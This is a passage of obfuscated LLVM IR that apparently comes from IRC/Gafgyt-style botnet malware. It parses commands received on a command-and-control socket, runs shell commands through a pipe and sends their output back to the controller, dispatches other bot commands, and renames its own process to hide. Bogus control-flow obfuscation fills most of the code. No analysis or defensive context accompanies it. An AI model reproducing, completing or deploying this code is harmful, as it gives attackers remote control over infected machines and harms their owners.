  br label %529

; <label>:529:                                    ; preds = %originalBBpart2108
  %530 = load i32, i32* %29, align 4
  %531 = add nsw i32 %530, 1
  store i32 %531, i32* %29, align 4
  br label %426

; <label>:532:                                    ; preds = %426
  %533 = load i32, i32* %28, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 %534
  store i8 0, i8* %535, align 1
  %536 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  call void @trim(i8* %536)
  %537 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %538 = call i8* @strstr(i8* %537, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0)) #10
  %539 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %540 = icmp eq i8* %538, %539
  br i1 %540, label %541, label %544

; <label>:541:                                    ; preds = %532
  %542 = load i32, i32* @mainCommSock, align 4
  %543 = call i32 (i32, i8*, ...) @sockprintf(i32 %542, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.551, i32 0, i32 0))
  br label %388

; <label>:544:                                    ; preds = %532
  %545 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %546 = call i8* @strstr(i8* %545, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.552, i32 0, i32 0)) #10
  %547 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %548 = icmp eq i8* %546, %547
  br i1 %548, label %549, label %573

; <label>:549:                                    ; preds = %544
  %550 = load i32, i32* @x.111
  %551 = load i32, i32* @y.112
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %549
  %558 = load i32, i32* %18, align 4
  %559 = add nsw i32 %558, 1
  store i32 %559, i32* %18, align 4
  %560 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.553, i32 0, i32 0))
  %561 = load i32, i32* %18, align 4
  %562 = icmp sgt i32 %561, 20
  %563 = load i32, i32* @x.111
  %564 = load i32, i32* @y.112
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart2115, label %originalBB110alteredBB

originalBBpart2115:                               ; preds = %originalBB110
  br i1 %562, label %571, label %572

; <label>:571:                                    ; preds = %originalBBpart2115
  call void @exit(i32 0) #14
  unreachable

; <label>:572:                                    ; preds = %originalBBpart2115
  br label %970

; <label>:573:                                    ; preds = %544
  %574 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  store i8* %574, i8** %32, align 8
  %575 = load i8*, i8** %32, align 8
  %576 = load i8, i8* %575, align 1
  %577 = zext i8 %576 to i32
  %578 = icmp eq i32 %577, 33
  br i1 %578, label %579, label %969

; <label>:579:                                    ; preds = %573
  %580 = load i8*, i8** %32, align 8
  %581 = getelementptr inbounds i8, i8* %580, i64 1
  store i8* %581, i8** %33, align 8
  br label %582

; <label>:582:                                    ; preds = %642, %579
  %583 = load i32, i32* @x.111
  %584 = load i32, i32* @y.112
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %582
  %591 = load i8*, i8** %33, align 8
  %592 = load i8, i8* %591, align 1
  %593 = zext i8 %592 to i32
  %594 = icmp ne i32 %593, 32
  %595 = load i32, i32* @x.111
  %596 = load i32, i32* @y.112
  %597 = sub i32 %595, 1
  %598 = mul i32 %595, %597
  %599 = urem i32 %598, 2
  %600 = icmp eq i32 %599, 0
  %601 = icmp slt i32 %596, 10
  %602 = or i1 %600, %601
  br i1 %602, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br i1 %594, label %603, label %624

; <label>:603:                                    ; preds = %originalBBpart2119
  %604 = load i32, i32* @x.111
  %605 = load i32, i32* @y.112
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %603
  %612 = load i8*, i8** %33, align 8
  %613 = load i8, i8* %612, align 1
  %614 = zext i8 %613 to i32
  %615 = icmp ne i32 %614, 0
  %616 = load i32, i32* @x.111
  %617 = load i32, i32* @y.112
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %624

; <label>:624:                                    ; preds = %originalBBpart2123, %originalBBpart2119
  %625 = phi i1 [ false, %originalBBpart2119 ], [ %615, %originalBBpart2123 ]
  %626 = load i32, i32* @x.111
  %627 = load i32, i32* @y.112
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %624
  %634 = load i32, i32* @x.111
  %635 = load i32, i32* @y.112
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br i1 %625, label %642, label %645

; <label>:642:                                    ; preds = %originalBBpart2127
  %643 = load i8*, i8** %33, align 8
  %644 = getelementptr inbounds i8, i8* %643, i32 1
  store i8* %644, i8** %33, align 8
  br label %582

; <label>:645:                                    ; preds = %originalBBpart2127
  %646 = load i32, i32* @x.111
  %647 = load i32, i32* @y.112
  %648 = sub i32 %646, 1
  %649 = mul i32 %646, %648
  %650 = urem i32 %649, 2
  %651 = icmp eq i32 %650, 0
  %652 = icmp slt i32 %647, 10
  %653 = or i1 %651, %652
  br i1 %653, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %645
  %654 = load i8*, i8** %33, align 8
  %655 = load i8, i8* %654, align 1
  %656 = zext i8 %655 to i32
  %657 = icmp eq i32 %656, 0
  %658 = load i32, i32* @x.111
  %659 = load i32, i32* @y.112
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br i1 %657, label %666, label %667

; <label>:666:                                    ; preds = %originalBBpart2131
  br label %388

; <label>:667:                                    ; preds = %originalBBpart2131
  %668 = load i8*, i8** %33, align 8
  store i8 0, i8* %668, align 1
  %669 = load i8*, i8** %32, align 8
  %670 = getelementptr inbounds i8, i8* %669, i64 1
  store i8* %670, i8** %33, align 8
  %671 = load i8*, i8** %32, align 8
  %672 = load i8*, i8** %33, align 8
  %673 = call i64 @strlen(i8* %672) #10
  %674 = getelementptr inbounds i8, i8* %671, i64 %673
  %675 = getelementptr inbounds i8, i8* %674, i64 2
  store i8* %675, i8** %32, align 8
  br label %676

; <label>:676:                                    ; preds = %originalBBpart2139, %667
  %677 = load i8*, i8** %32, align 8
  %678 = load i8*, i8** %32, align 8
  %679 = call i64 @strlen(i8* %678) #10
  %680 = sub i64 %679, 1
  %681 = getelementptr inbounds i8, i8* %677, i64 %680
  %682 = load i8, i8* %681, align 1
  %683 = zext i8 %682 to i32
  %684 = icmp eq i32 %683, 10
  br i1 %684, label %694, label %685

; <label>:685:                                    ; preds = %676
  %686 = load i8*, i8** %32, align 8
  %687 = load i8*, i8** %32, align 8
  %688 = call i64 @strlen(i8* %687) #10
  %689 = sub i64 %688, 1
  %690 = getelementptr inbounds i8, i8* %686, i64 %689
  %691 = load i8, i8* %690, align 1
  %692 = zext i8 %691 to i32
  %693 = icmp eq i32 %692, 13
  br label %694

; <label>:694:                                    ; preds = %685, %676
  %695 = phi i1 [ true, %676 ], [ %693, %685 ]
  br i1 %695, label %696, label %718

; <label>:696:                                    ; preds = %694
  %697 = load i32, i32* @x.111
  %698 = load i32, i32* @y.112
  %699 = sub i32 %697, 1
  %700 = mul i32 %697, %699
  %701 = urem i32 %700, 2
  %702 = icmp eq i32 %701, 0
  %703 = icmp slt i32 %698, 10
  %704 = or i1 %702, %703
  br i1 %704, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %696
  %705 = load i8*, i8** %32, align 8
  %706 = load i8*, i8** %32, align 8
  %707 = call i64 @strlen(i8* %706) #10
  %708 = sub i64 %707, 1
  %709 = getelementptr inbounds i8, i8* %705, i64 %708
  store i8 0, i8* %709, align 1
  %710 = load i32, i32* @x.111
  %711 = load i32, i32* @y.112
  %712 = sub i32 %710, 1
  %713 = mul i32 %710, %712
  %714 = urem i32 %713, 2
  %715 = icmp eq i32 %714, 0
  %716 = icmp slt i32 %711, 10
  %717 = or i1 %715, %716
  br i1 %717, label %originalBBpart2139, label %originalBB133alteredBB

originalBBpart2139:                               ; preds = %originalBB133
  br label %676

; <label>:718:                                    ; preds = %694
  %719 = load i8*, i8** %32, align 8
  store i8* %719, i8** %34, align 8
  br label %720

; <label>:720:                                    ; preds = %originalBBpart2147, %718
  %721 = load i8*, i8** %32, align 8
  %722 = load i8, i8* %721, align 1
  %723 = zext i8 %722 to i32
  %724 = icmp ne i32 %723, 32
  br i1 %724, label %725, label %746

; <label>:725:                                    ; preds = %720
  %726 = load i32, i32* @x.111
  %727 = load i32, i32* @y.112
  %728 = sub i32 %726, 1
  %729 = mul i32 %726, %728
  %730 = urem i32 %729, 2
  %731 = icmp eq i32 %730, 0
  %732 = icmp slt i32 %727, 10
  %733 = or i1 %731, %732
  br i1 %733, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %725
  %734 = load i8*, i8** %32, align 8
  %735 = load i8, i8* %734, align 1
  %736 = zext i8 %735 to i32
  %737 = icmp ne i32 %736, 0
  %738 = load i32, i32* @x.111
  %739 = load i32, i32* @y.112
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br label %746

; <label>:746:                                    ; preds = %originalBBpart2143, %720
  %747 = phi i1 [ false, %720 ], [ %737, %originalBBpart2143 ]
  br i1 %747, label %748, label %767

; <label>:748:                                    ; preds = %746
  %749 = load i32, i32* @x.111
  %750 = load i32, i32* @y.112
  %751 = sub i32 %749, 1
  %752 = mul i32 %749, %751
  %753 = urem i32 %752, 2
  %754 = icmp eq i32 %753, 0
  %755 = icmp slt i32 %750, 10
  %756 = or i1 %754, %755
  br i1 %756, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %748
  %757 = load i8*, i8** %32, align 8
  %758 = getelementptr inbounds i8, i8* %757, i32 1
  store i8* %758, i8** %32, align 8
  %759 = load i32, i32* @x.111
  %760 = load i32, i32* @y.112
  %761 = sub i32 %759, 1
  %762 = mul i32 %759, %761
  %763 = urem i32 %762, 2
  %764 = icmp eq i32 %763, 0
  %765 = icmp slt i32 %760, 10
  %766 = or i1 %764, %765
  br i1 %766, label %originalBBpart2147, label %originalBB145alteredBB

originalBBpart2147:                               ; preds = %originalBB145
  br label %720

; <label>:767:                                    ; preds = %746
  %768 = load i8*, i8** %32, align 8
  store i8 0, i8* %768, align 1
  %769 = load i8*, i8** %32, align 8
  %770 = getelementptr inbounds i8, i8* %769, i32 1
  store i8* %770, i8** %32, align 8
  %771 = load i8*, i8** %34, align 8
  store i8* %771, i8** %35, align 8
  br label %772

; <label>:772:                                    ; preds = %originalBBpart2151, %767
  %773 = load i8*, i8** %35, align 8
  %774 = load i8, i8* %773, align 1
  %775 = icmp ne i8 %774, 0
  br i1 %775, label %776, label %801

; <label>:776:                                    ; preds = %772
  %777 = load i32, i32* @x.111
  %778 = load i32, i32* @y.112
  %779 = sub i32 %777, 1
  %780 = mul i32 %777, %779
  %781 = urem i32 %780, 2
  %782 = icmp eq i32 %781, 0
  %783 = icmp slt i32 %778, 10
  %784 = or i1 %782, %783
  br i1 %784, label %originalBB149, label %originalBB149alteredBB

originalBB149:                                    ; preds = %originalBB149alteredBB, %776
  %785 = load i8*, i8** %35, align 8
  %786 = load i8, i8* %785, align 1
  %787 = zext i8 %786 to i32
  %788 = call i32 @toupper(i32 %787) #10
  %789 = trunc i32 %788 to i8
  %790 = load i8*, i8** %35, align 8
  store i8 %789, i8* %790, align 1
  %791 = load i8*, i8** %35, align 8
  %792 = getelementptr inbounds i8, i8* %791, i32 1
  store i8* %792, i8** %35, align 8
  %793 = load i32, i32* @x.111
  %794 = load i32, i32* @y.112
  %795 = sub i32 %793, 1
  %796 = mul i32 %793, %795
  %797 = urem i32 %796, 2
  %798 = icmp eq i32 %797, 0
  %799 = icmp slt i32 %794, 10
  %800 = or i1 %798, %799
  br i1 %800, label %originalBBpart2151, label %originalBB149alteredBB

originalBBpart2151:                               ; preds = %originalBB149
  br label %772

; <label>:801:                                    ; preds = %772
  %802 = load i8*, i8** %34, align 8
  %803 = call i32 @strcmp(i8* %802, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.554, i32 0, i32 0)) #10
  %804 = icmp eq i32 %803, 0
  br i1 %804, label %805, label %863

; <label>:805:                                    ; preds = %801
  %806 = call i32 @listFork()
  %807 = icmp ne i32 %806, 0
  br i1 %807, label %808, label %809

; <label>:808:                                    ; preds = %805
  br label %388

; <label>:809:                                    ; preds = %805
  %810 = load i32, i32* @x.111
  %811 = load i32, i32* @y.112
  %812 = sub i32 %810, 1
  %813 = mul i32 %810, %812
  %814 = urem i32 %813, 2
  %815 = icmp eq i32 %814, 0
  %816 = icmp slt i32 %811, 10
  %817 = or i1 %815, %816
  br i1 %817, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %809
  %818 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %818, i8 0, i64 1024, i32 16, i1 false)
  %819 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %820 = load i8*, i8** %32, align 8
  %821 = call i32 (i8*, i8*, ...) @szprintf(i8* %819, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.555, i32 0, i32 0), i8* %820)
  %822 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %823 = call i32 @fdpopen(i8* %822, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store i32 %823, i32* %37, align 4
  %824 = load i32, i32* @x.111
  %825 = load i32, i32* @y.112
  %826 = sub i32 %824, 1
  %827 = mul i32 %824, %826
  %828 = urem i32 %827, 2
  %829 = icmp eq i32 %828, 0
  %830 = icmp slt i32 %825, 10
  %831 = or i1 %829, %830
  br i1 %831, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br label %832

; <label>:832:                                    ; preds = %originalBBpart2159, %originalBBpart2155
  %833 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %834 = load i32, i32* %37, align 4
  %835 = call i8* @fdgets(i8* %833, i32 1024, i32 %834)
  %836 = icmp ne i8* %835, null
  br i1 %836, label %837, label %860

; <label>:837:                                    ; preds = %832
  %838 = load i32, i32* @x.111
  %839 = load i32, i32* @y.112
  %840 = sub i32 %838, 1
  %841 = mul i32 %838, %840
  %842 = urem i32 %841, 2
  %843 = icmp eq i32 %842, 0
  %844 = icmp slt i32 %839, 10
  %845 = or i1 %843, %844
  br i1 %845, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %837
  %846 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %846)
  %847 = load i32, i32* @mainCommSock, align 4
  %848 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %849 = call i32 (i32, i8*, ...) @sockprintf(i32 %847, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.556, i32 0, i32 0), i8* %848)
  %850 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %850, i8 0, i64 1024, i32 16, i1 false)
  %851 = call i32 @sleep(i32 1)
  %852 = load i32, i32* @x.111
  %853 = load i32, i32* @y.112
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %832

; <label>:860:                                    ; preds = %832
  %861 = load i32, i32* %37, align 4
  %862 = call i32 @fdpclose(i32 %861)
  call void @exit(i32 0) #14
  unreachable

; <label>:863:                                    ; preds = %801
  store i32 1, i32* %39, align 4
  %864 = load i8*, i8** %32, align 8
  %865 = call i8* @strtok(i8* %864, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i32 0, i32 0)) #2
  store i8* %865, i8** %40, align 8
  %866 = load i8*, i8** %34, align 8
  %867 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 0
  store i8* %866, i8** %867, align 16
  br label %868

; <label>:868:                                    ; preds = %931, %863
  %869 = load i32, i32* @x.111
  %870 = load i32, i32* @y.112
  %871 = sub i32 %869, 1
  %872 = mul i32 %869, %871
  %873 = urem i32 %872, 2
  %874 = icmp eq i32 %873, 0
  %875 = icmp slt i32 %870, 10
  %876 = or i1 %874, %875
  br i1 %876, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %868
  %877 = load i8*, i8** %40, align 8
  %878 = icmp ne i8* %877, null
  %879 = load i32, i32* @x.111
  %880 = load i32, i32* @y.112
  %881 = sub i32 %879, 1
  %882 = mul i32 %879, %881
  %883 = urem i32 %882, 2
  %884 = icmp eq i32 %883, 0
  %885 = icmp slt i32 %880, 10
  %886 = or i1 %884, %885
  br i1 %886, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br i1 %878, label %887, label %933

; <label>:887:                                    ; preds = %originalBBpart2163
  %888 = load i8*, i8** %40, align 8
  %889 = load i8, i8* %888, align 1
  %890 = zext i8 %889 to i32
  %891 = icmp ne i32 %890, 10
  br i1 %891, label %892, label %931

; <label>:892:                                    ; preds = %887
  %893 = load i32, i32* @x.111
  %894 = load i32, i32* @y.112
  %895 = sub i32 %893, 1
  %896 = mul i32 %893, %895
  %897 = urem i32 %896, 2
  %898 = icmp eq i32 %897, 0
  %899 = icmp slt i32 %894, 10
  %900 = or i1 %898, %899
  br i1 %900, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %892
  %901 = load i8*, i8** %40, align 8
  %902 = call i64 @strlen(i8* %901) #10
  %903 = add i64 %902, 1
  %904 = call noalias i8* @malloc(i64 %903) #2
  %905 = load i32, i32* %39, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %906
  store i8* %904, i8** %907, align 8
  %908 = load i32, i32* %39, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %909
  %911 = load i8*, i8** %910, align 8
  %912 = load i8*, i8** %40, align 8
  %913 = call i64 @strlen(i8* %912) #10
  %914 = add i64 %913, 1
  call void @llvm.memset.p0i8.i64(i8* %911, i8 0, i64 %914, i32 1, i1 false)
  %915 = load i32, i32* %39, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %916
  %918 = load i8*, i8** %917, align 8
  %919 = load i8*, i8** %40, align 8
  %920 = call i8* @strcpy(i8* %918, i8* %919) #2
  %921 = load i32, i32* %39, align 4
  %922 = add nsw i32 %921, 1
  store i32 %922, i32* %39, align 4
  %923 = load i32, i32* @x.111
  %924 = load i32, i32* @y.112
  %925 = sub i32 %923, 1
  %926 = mul i32 %923, %925
  %927 = urem i32 %926, 2
  %928 = icmp eq i32 %927, 0
  %929 = icmp slt i32 %924, 10
  %930 = or i1 %928, %929
  br i1 %930, label %originalBBpart2191, label %originalBB165alteredBB

originalBBpart2191:                               ; preds = %originalBB165
  br label %931

; <label>:931:                                    ; preds = %originalBBpart2191, %887
  %932 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i32 0, i32 0)) #2
  store i8* %932, i8** %40, align 8
  br label %868

; <label>:933:                                    ; preds = %originalBBpart2163
  %934 = load i32, i32* %39, align 4
  %935 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i32 0, i32 0
  call void @processCmd(i32 %934, i8** %935)
  %936 = load i32, i32* %39, align 4
  %937 = icmp sgt i32 %936, 1
  br i1 %937, label %938, label %968

; <label>:938:                                    ; preds = %933
  %939 = load i32, i32* @x.111
  %940 = load i32, i32* @y.112
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %938
  store i32 1, i32* %41, align 4
  store i32 1, i32* %41, align 4
  %947 = load i32, i32* @x.111
  %948 = load i32, i32* @y.112
  %949 = sub i32 %947, 1
  %950 = mul i32 %947, %949
  %951 = urem i32 %950, 2
  %952 = icmp eq i32 %951, 0
  %953 = icmp slt i32 %948, 10
  %954 = or i1 %952, %953
  br i1 %954, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br label %955

; <label>:955:                                    ; preds = %964, %originalBBpart2195
  %956 = load i32, i32* %41, align 4
  %957 = load i32, i32* %39, align 4
  %958 = icmp slt i32 %956, %957
  br i1 %958, label %959, label %967

; <label>:959:                                    ; preds = %955
  %960 = load i32, i32* %41, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %961
  %963 = load i8*, i8** %962, align 8
  call void @free(i8* %963) #2
  br label %964

; <label>:964:                                    ; preds = %959
  %965 = load i32, i32* %41, align 4
  %966 = add nsw i32 %965, 1
  store i32 %966, i32* %41, align 4
  br label %955

; <label>:967:                                    ; preds = %955
  br label %968

; <label>:968:                                    ; preds = %967, %933
  br label %969

; <label>:969:                                    ; preds = %968, %573
  br label %388

; <label>:970:                                    ; preds = %572, %originalBBpart283
  br label %345
                                                  ; No predecessors!
  %972 = load i32, i32* @x.111
  %973 = load i32, i32* @y.112
  %974 = sub i32 %972, 1
  %975 = mul i32 %972, %974
  %976 = urem i32 %975, 2
  %977 = icmp eq i32 %976, 0
  %978 = icmp slt i32 %973, 10
  %979 = or i1 %977, %978
  br i1 %979, label %originalBB197, label %originalBB197alteredBB

originalBB197:                                    ; preds = %originalBB197alteredBB, %971
  %980 = load i32, i32* %11, align 4
  %981 = load i32, i32* @x.111
  %982 = load i32, i32* @y.112
  %983 = sub i32 %981, 1
  %984 = mul i32 %981, %983
  %985 = urem i32 %984, 2
  %986 = icmp eq i32 %985, 0
  %987 = icmp slt i32 %982, 10
  %988 = or i1 %986, %987
  br i1 %988, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  ret i32 %980

originalBBalteredBB:                              ; preds = %originalBB, %2
  %989 = alloca i32, align 4
  %990 = alloca i32, align 4
  %991 = alloca i8**, align 8
  %992 = alloca i8*, align 8
  %993 = alloca i32, align 4
  %994 = alloca i32, align 4
  %995 = alloca i32, align 4
  %996 = alloca i32, align 4
  %997 = alloca [256 x i8], align 16
  %998 = alloca i8*, align 8
  %999 = alloca %struct._IO_FILE*, align 8
  %1000 = alloca [256 x i8], align 16
  %1001 = alloca [1024 x i8], align 16
  %1002 = alloca i32, align 4
  %1003 = alloca i32, align 4
  %1004 = alloca %struct._IO_FILE*, align 8
  %1005 = alloca [4096 x i8], align 16
  %1006 = alloca i32, align 4
  %1007 = alloca i32, align 4
  %1008 = alloca i32*, align 8
  %1009 = alloca i32, align 4
  %1010 = alloca i8*, align 8
  %1011 = alloca i8*, align 8
  %1012 = alloca i8*, align 8
  %1013 = alloca i8*, align 8
  %1014 = alloca [1024 x i8], align 16
  %1015 = alloca i32, align 4
  %1016 = alloca [10 x i8*], align 16
  %1017 = alloca i32, align 4
  %1018 = alloca i8*, align 8
  %1019 = alloca i32, align 4
  store i32 0, i32* %989, align 4
  store i32 %0, i32* %990, align 4
  store i8** %1, i8*** %991, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %992, align 8
  %1020 = load i8**, i8*** %991, align 8
  %1021 = getelementptr inbounds i8*, i8** %1020, i64 0
  %1022 = load i8*, i8** %1021, align 8
  %1023 = load i8**, i8*** %991, align 8
  %1024 = getelementptr inbounds i8*, i8** %1023, i64 0
  %1025 = load i8*, i8** %1024, align 8
  %1026 = call i64 @strlen(i8* %1025) #10
  %1027 = call i8* @strncpy(i8* %1022, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i64 %1026) #2
  %1028 = load i8**, i8*** %991, align 8
  %1029 = getelementptr inbounds i8*, i8** %1028, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %1029, align 8
  %1030 = load i8*, i8** %992, align 8
  %1031 = ptrtoint i8* %1030 to i64
  %1032 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %1031, i32 0, i32 0, i32 0)
  %1033 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1034 = call i32 @getpid() #2
  %_ = sub i32 0, %1033
  %gen = add i32 %_, %1034
  %_1 = sub i32 %1033, %1034
  %gen2 = mul i32 %_1, %1034
  %_3 = shl i32 %1033, %1034
  %_4 = sub i32 0, %1033
  %gen5 = add i32 %_4, %1034
  %_6 = sub i32 0, %1033
  %gen7 = add i32 %_6, %1034
  %_8 = sub i32 %1033, %1034
  %gen9 = mul i32 %_8, %1034
  %_10 = sub i32 %1033, %1034
  %gen11 = mul i32 %_10, %1034
  %_12 = sub i32 %1033, %1034
  %gen13 = mul i32 %_12, %1034
  %1035 = xor i32 %1033, %1034
  call void @srand(i32 %1035) #2
  %1036 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1037 = call i32 @getpid() #2
  %_14 = sub i32 0, %1036
  %gen15 = add i32 %_14, %1037
  %_16 = sub i32 %1036, %1037
  %gen17 = mul i32 %_16, %1037
  %_18 = shl i32 %1036, %1037
  %_19 = shl i32 %1036, %1037
  %_20 = sub i32 %1036, %1037
  %gen21 = mul i32 %_20, %1037
  %_22 = shl i32 %1036, %1037
  %1038 = xor i32 %1036, %1037
  call void @init_rand(i32 %1038)
  store i32 0, i32* %996, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i32 0, i32 0), i8** %998, align 8
  %1039 = load i8*, i8** %998, align 8
  %1040 = call %struct._IO_FILE* @fopen(i8* %1039, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %1040, %struct._IO_FILE** %999, align 8
  %1041 = load %struct._IO_FILE*, %struct._IO_FILE** %999, align 8
  %1042 = icmp eq %struct._IO_FILE* %1041, null
  br label %originalBB

originalBB23alteredBB:                            ; preds = %originalBB23, %73
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i32 0, i32 0), i8** %20, align 8
  %1043 = load i8*, i8** %20, align 8
  %1044 = call %struct._IO_FILE* @fopen(i8* %1043, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %1044, %struct._IO_FILE** %21, align 8
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %130
  %1045 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1046 = call i32 @feof(%struct._IO_FILE* %1045) #2
  %1047 = icmp ne i32 %1046, 0
